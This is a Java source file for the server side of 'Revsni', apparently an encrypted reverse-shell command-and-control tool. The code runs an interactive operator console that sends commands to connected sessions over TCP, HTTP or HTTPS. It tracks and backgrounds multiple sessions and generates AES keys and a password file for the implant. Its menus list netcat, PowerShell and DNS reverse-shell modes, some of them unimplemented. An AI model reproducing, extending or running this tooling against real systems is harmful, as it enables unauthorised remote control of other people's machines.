package com.revsni.server;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Observable;
import java.util.UUID;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;

import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import com.revsni.Revsni;
import com.revsni.common.Configuration;
import com.revsni.common.Configuration.Mode;
import com.revsni.server.http.HTTPShell;
import com.revsni.server.https.HTTPSShell;
import com.revsni.utils.SessionInfo;
import com.revsni.utils.ThreadMonitor;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.passay.CharacterRule;
import org.passay.EnglishCharacterData;
import org.passay.CharacterData;
import org.passay.PasswordGenerator;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;



public class Server implements Runnable{
    private Configuration configuration;
    private volatile boolean running;
    private volatile int port;
    private volatile int portIn;
    private volatile SecretKey key;
    private volatile IvParameterSpec iv;
    private volatile boolean first = true;
    public volatile String shellType;
    private volatile Updater updater;
    private volatile HTTPShell httpShell;
    private volatile HTTPSShell httpsShell;
    private volatile Listener listener;
    public volatile ThreadMonitor threadMonitor;
    public volatile int sessionNumber;


    //UUID, Name, IP, Port, Mode, Thread
    public static volatile HashMap<UUID, SessionInfo<String, String, Integer, Mode, Thread>> sessions = new HashMap<>();
    public static List<UUID> sessionList = new ArrayList<>();

    public volatile Map<Integer, Handler> handlerinos = new ConcurrentHashMap<>();

    Logger logger = LogManager.getLogger(getClass());



    public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor, int sessionNumber) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
        this.sessionNumber = sessionNumber;
        
        this.threadMonitor = monitor;
        
        initServer(ip, port, pass, salt);


    }

    public boolean initServer(String ip, int port, String password, String saltForPass) {
        shellType = "TCP";
        this.port = port;
        //this.ip = ip;
        //this.pass = password;
        //this.salt = saltForPass;

        updater = new Updater(ip, port, password, saltForPass);

        try {
            this.key = updater.generateKey();
            //this.key = updater.generateKeyRandom(128);
        } catch (NoSuchAlgorithmException | InvalidKeySpecException e1) {
            e1.printStackTrace();
            return false;
        }
        this.iv = updater.generateIv();

        updater.setKey(key);
        updater.setIv(iv);

        updater.generateOutputString();
        try {
            if(updater.writeOut()) {
                logger.debug("File output.txt wrote!");
                return true;
            } else {
                return false;
            }
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    @Override
    public void run() {
        if(!isRunning() && first) {
            listener = new Listener(this, sessionNumber);
            Thread listenerThread = new Thread(listener);
            listenerThread.start();
            System.out.println("Listener started!");
        }
        while(isRunning()) {
            try {
                String message;
                do {
                    if(first) { logger.info("Enter 'help' if you dont know what to do.\n\nListening...\n");}
                    first = false;

                    InputStreamReader inputStreamReader = new InputStreamReader(System.in);
                    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                    
                    message = bufferedReader.readLine();

                    //setChanged();

                    switch(message) {
                        case("help"): printHelp(); break;
                        case("usage"): printUsage(); break;
                        case("configure"): printConfigure(); break;
                        case("switch"): 
                            printSwitch();
                            System.out.println("---Enter anything else to leave this menu.---\n");
                            System.out.print("Revsn [" + shellType + "] » ");
                            String tmp = bufferedReader.readLine();
                            switch(tmp) {
                                case("http"): 
                                    System.out.print("Specify a Port on which HTTP-Server should listen on: ");
                                    int port = Integer.parseInt(bufferedReader.readLine());
                                    httpShell = new HTTPShell(key, iv, port);
                                    updater.setShellType("HTTP", String.valueOf(httpShell.getPort()));
                                    updater.generateOutputString();
                                    updater.writeOut();
                                    handlerinos.get(sessionNumber).update("httpSw");
                                    shellType = "HTTP";
                                    if(!httpShell.getConnInf()) {
                                        logger.info("Failed to switch shell to HTTP!");
                                        updater.setShellType("TCP", String.valueOf(this.port));
                                        shellType = "TCP";
                                    }
                                    break;

                                case("https"): 
                                    System.out.print("Specify a Port on which HTTPS-Server should listen on: ");
                                    int portIn = Integer.parseInt(bufferedReader.readLine());
                                    httpsShell = new HTTPSShell(key, iv, portIn);
                                    httpsShell.fireUp(portIn);
                                    updater.setShellType("HTTPS", String.valueOf(httpsShell.getPort()));
                                    updater.generateOutputString();
                                    updater.writeOut();
                                    handlerinos.get(sessionNumber).update("httpsSw");
                                    shellType = "HTTPS";
                                    break;
                            
                                default:
                                    break;
                            } 
                            break;
                        case("mode"): printMode(); break;
                        case("kill"): handlerinos.get(sessionNumber).update("kill"); break;
                        case("exit"): handlerinos.get(sessionNumber).update("exit"); Revsni.setActive(false); return;
                        case("encryption"): printEncryption(); break;
                        case("bg"):
                            Revsni.setActiveHelper(true); 
                            synchronized(threadMonitor) {
                                try {
                                    threadMonitor.wait();
                                } catch(InterruptedException e) {

                                }
                            }
                            System.out.print("\nRevsn [" + shellType + "] » ");
                            break;  
                            
                        case("sessions"):
                            printSessions();

                            System.out.print("Which session you want to interact with? (type 'none' to exit): ");
                            String decSession = bufferedReader.readLine();
                            handlerinos.get(sessionNumber).update("");
                            

                            break;
                        default: 
                            if(shellType.equals("TCP")) {
                                handlerinos.get(sessionNumber).update(message);
                            }
                            if(shellType.equals("HTTP")) {
                                httpShell.sendCommand(message);
                            }
                            if(shellType.equals("HTTPS")) {
                                httpsShell.sendCommand(message);
                            }
                            
                        
                    }

                    
                    
                } 
                while(!message.equals("quit"));
            } catch (IOException e) {

                e.printStackTrace(); 
            }
            finally {
                setRunning(false);
                logger.info("Server is shutting down");
                try {
                    listener.stopListening();
                    Thread.sleep(10000);
                }
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    //Pass and Salt gen
    public static String generatePassOrSalt() {
        PasswordGenerator gen = new PasswordGenerator();
        CharacterData lowerCaseChars = EnglishCharacterData.LowerCase;
        CharacterRule lowerCaseRule = new CharacterRule(lowerCaseChars);
        lowerCaseRule.setNumberOfCharacters(2);
    
        CharacterData upperCaseChars = EnglishCharacterData.UpperCase;
        CharacterRule upperCaseRule = new CharacterRule(upperCaseChars);
        upperCaseRule.setNumberOfCharacters(2);
    
        CharacterData digitChars = EnglishCharacterData.Digit;
        CharacterRule digitRule = new CharacterRule(digitChars);
        digitRule.setNumberOfCharacters(2);
    
        CharacterData specialChars = new CharacterData() {
            public String getErrorCode() {
                return "Error while generating special chars for pass/salt!";
            }
    
            public String getCharacters() {
                return "!@#$%^&*()_+";
            }
        };
        CharacterRule splCharRule = new CharacterRule(specialChars);
        splCharRule.setNumberOfCharacters(2);
    
        String password = gen.generatePassword(10, splCharRule, lowerCaseRule, 
          upperCaseRule, digitRule);
        return password;
    }

    //Getter and Setter

    public synchronized boolean isRunning() {
        return running;
    }

    public synchronized void setRunning(boolean running) {
        this.running = running;
    }

    public synchronized int getPort() {
        return this.port;
    }

    public void setPort(int port) {
        this.port = port;
    }
    public SecretKey getKey() {
        return this.key;
    }
    public IvParameterSpec getIv() {
        return this.iv;
    }

    public void setConfig(Configuration config) {
        this.configuration = config;
        this.shellType = config.getMode().toString();

        //Implement applying config to TCP, HTTP, HTTPS and stuff.
    }


    //Session handling

    public static void addSession(UUID uuid, String name, String ipAddr, int port, Mode mode, Thread thread) {
        //UUID, Name, IP, Port, Mode, Thread

        sessions.put(uuid, new SessionInfo<String,String,Integer,Mode,Thread>(name, ipAddr, port, mode, thread));
    }

    public static void removeSession(UUID uuid) {
       sessions.remove(uuid);
    }

    public static void removeSession(String name) {
       if(sessions.values().stream().findAny().get().name.contains(name)) {
           for(Entry<UUID, SessionInfo<String, String, Integer, Mode, Thread>> entry : sessions.entrySet()) {
               if(entry.getValue().name.equals(name)) {
                   sessions.remove(entry.getKey());
               }
           }
       }
    }

    public void addHandlerino(Handler handler, int sessionNumber) {
        handlerinos.put(sessionNumber, handler);
    }

    public void removeHandlerino(int sessionNumber) {
        handlerinos.remove(sessionNumber);
    }

    public void printSessions() {

    }




    //Menus

    private void printHelp() {
        System.out.println("\n"
                          +"-----------"
                          +"|Help Menu|"
                          +"-----------"
                          +"\n"
                          +"mode        -   Use netcat for example\n"
                          +"encryption  -   Change between different encryptions or combine them\n"
                          +"switch      -   Switch Shell\n"
                          +"configure   -   Configure Revsn\n"
                          +"bg          -   Background Session\n"
                          +"quit        -   Closes connection\n"
                          +"\n");
    }

    private void printMode() {
        System.out.println("\n"
                          +"-----------"
                          +"|Mode Menu|"
                          +"-----------"
                          +"\n"
                          +"vanilla     -   Use Revsni Java Interface\n"
                          +"safe        -   Use predefined Commands\n"
                          +"nc          -   Use netcat\n"
                          +"ps          -   Use Powershell (Windows only!)\n"
                          +"\n");
    }

    private void printConfigure() {
        System.out.println("\n"
                          +"-----------"
                          +"|Configuration Menu|"
                          +"-----------"
                          +"\n"
                          +"charset     -   Configure used charset for compatibility\n"
                          +"shells      -   Configure Parameters of different Shells\n"
                          +"\n");
    }

    private void printSwitch() {
        System.out.println("\n"
                          +"-----------"
                          +"|Shell Menu|"
                          +"-----------"
                          +"\n"
                          +"udp         -   Change to UDP Shell\n"
                          +"http        -   Change to HTTP Shell\n"
                          +"https       -   Change to HTTPS Shell\n"
                          +"httpas      -   Change to Asynchronous HTTP Shell\n"
                          +"httpsas     -   Change to Asynchronous HTTPS Shell\n"
                          +"dns         -   Change to DNS Reverse Shell\n"
                          +"\n");
    }

    private void printEncryption() {
        System.out.println("\n"
                          +"-----------"
                          +"|Encryption Menu|"
                          +"-----------"
                          +"\n"
                          +"AES         -   AES in CBC mode\n"
                          +"RSA         -   Well, seems like RSA\n"
                          +"Triple DES  -   Used for example to encrypt UNIX password and ATM pins\n"
                          +"Blowfish    -   Blow da fish Kanye\n"
                          +"Twofish     -   u know Kanye\n"
                          +"Serpent     -   Is it a Python?!\n"
                          +"\n");
    }

    private static void printUsage() {
        System.out.println("\n"
                          +"-----------"
                          +"|Usage|"
                          +"-----------"
                          +"\n"
                          +"For now Revsni needs AES for initial connection\n you don't have to specify a password\n  nor a salt\n   but they will be generated and saved into a file called output.txt!\n"
                          +"\nMinimal:\n\tjava -jar server.jar <Server-IP> <Server-Port>\n"
                          +"\nRecommendend:\n\tjava -jar server.jar <Server-IP> <Server-Port> <Password> <Salt>\n"
                          +"\nIt's okay to not specify a salt as it will be generated anyways. :) \n"
                          +"\n");
    }

}
